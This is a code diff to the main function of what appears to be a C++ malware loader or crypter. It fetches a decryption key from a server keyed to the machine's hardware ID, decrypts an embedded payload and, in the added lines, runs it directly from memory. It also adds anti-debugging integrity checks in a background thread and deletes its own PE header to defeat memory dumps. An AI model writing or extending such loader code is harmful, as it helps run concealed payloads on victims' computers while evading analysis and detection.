@@ -6,18 +6,19 @@
 #include "PayloadManager.hpp"
 #include "Identification.hpp"
 
+#include "RunProcess.hpp"
+
 #ifndef _DEBUG
 // If RELEASE
 #pragma optimize("x", on)
 #endif // !_DEBUG
 
+
+
 int main() {
     // Init Antidebugging
     AntiDebugging antiDbg;
     antiDbg.start();
-
-    // Delete own PE header
-    // AntiDumping::DeletePEHeader();
 
     antiDbg.KillIfIntegrityCheckFails();
     string response = ServerRequests::GetDecryptKey(Identification::GetHWID());
@@ -30,17 +31,33 @@ int main() {
         exit(-6);
     };
 
-    PayloadManager* pm = new PayloadManager();
+    PayloadManager* payloadManager = new PayloadManager();
 
     antiDbg.KillIfIntegrityCheckFails();
-    vector<BYTE>* dPayload = pm->GetDecryptedPayload(response);
+    vector<BYTE>* dPayload = payloadManager->GetDecryptedPayload(response);
 
     antiDbg.KillIfIntegrityCheckFails();
     cout << dPayload->data()[0] << dPayload->data()[1] << dPayload->data()[2] << endl;
 
-    cin.get();
+    antiDbg.KillIfIntegrityCheckFails();
+    RunProcess* runProcess = new RunProcess();
+    runProcess->RunProcessFromMemory(nullptr, payloadManager->GetOEP());
 
-    cout << "bye" << endl;
+    thread checkIntegrity = thread([&antiDbg]() {
+        while (true) {
+            cout << "Integrity check..." << endl;
+            antiDbg.KillIfIntegrityCheckFails();
+            Sleep(1000);
+        }
+    });
+
+    // Delete own PE header
+    AntiDumping::DeletePEHeader();
+
+    delete payloadManager;
+    delete runProcess;
+    checkIntegrity.join();
 
     return 0;
+
 }
